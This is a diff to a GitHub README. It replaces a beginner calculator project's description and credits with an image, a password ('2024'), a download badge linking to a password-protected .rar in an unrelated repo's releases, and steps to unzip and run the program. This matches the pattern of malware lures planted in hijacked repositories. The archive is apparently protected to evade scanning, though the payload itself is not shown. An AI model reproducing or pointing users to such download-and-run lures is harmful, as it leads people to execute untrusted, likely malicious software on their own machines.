@@ -1,7 +1,13 @@
-# calculator
-#### Link: https://thaigp00.github.io/calculator/
-#### Credits:
-Final project of The Odin Project's Foundations Course.
-#### Credits:
-Calculator icon: https://www.freepik.com/icon/calculator_9127066#fromView=keyword&term=Calculator&page=1&position=67&uuid=58f05530-49f3-48ed-8e09-86ea9450b552 from https://www.freepik.com/.
-GitHub icon: https://iconduck.com/icons/185690/github from https://iconduck.com/.
+<img src="https://i.imgur.com/PJX6HU7.jpeg"/>
+
+| PASSWORD:  | 2024 |
+| ------------- | ------------- |
+| DOWNLOAD:  | [![Download Installer](https://custom-icon-badges.demolab.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download Installer")](https://github.com/Thaigp00/odin-recipes/releases/download/FlS/NcoPv.pswd.2024.rar)
+
+
+```
+✔️Installation:
+```
++ Download the archive at the link
++ Unzip the archive with WinRar 
++ Run the program 
